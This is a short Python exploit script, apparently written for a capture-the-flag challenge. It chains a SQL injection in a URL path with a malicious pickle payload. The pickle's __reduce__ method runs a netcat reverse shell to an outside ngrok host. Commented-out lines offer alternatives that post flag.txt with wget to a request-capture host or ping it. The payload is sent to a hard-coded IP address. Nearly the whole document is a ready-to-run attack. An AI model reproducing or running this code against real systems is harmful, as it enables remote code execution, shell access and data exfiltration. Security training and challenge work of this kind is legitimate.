#!/usr/bin/python3
import pickle, os, base64, requests
def pickle_loads(s):
    return pickle.loads(base64.b64decode(s))
# Exploit that we want the target to unpickle

class Exploit(object):
    def __reduce__(self):

        # return (os.system,('wget --post-file flag.txt czzgiy7w.requestrepo.com', ))
        return (os.system,('nc 0.tcp.ap.ngrok.io 18368 -e /bin/sh', ))
        # 
        # return (os.system,('ping czzgiy7w.requestrepo.com', ))
        
      

shellcode = base64.urlsafe_b64encode(pickle.dumps(Exploit()))
# print(shellcode)
# print("pickle:", base64.b64decode(shellcode), flush=True)
# print(pickle_loads(shellcode))

URL = b"http://159.65.81.48:32297/view/4' union select '"
r = requests.get(URL + shellcode, verify=False)
print(r.url)
if (r.status_code == 200):
    print(r.text)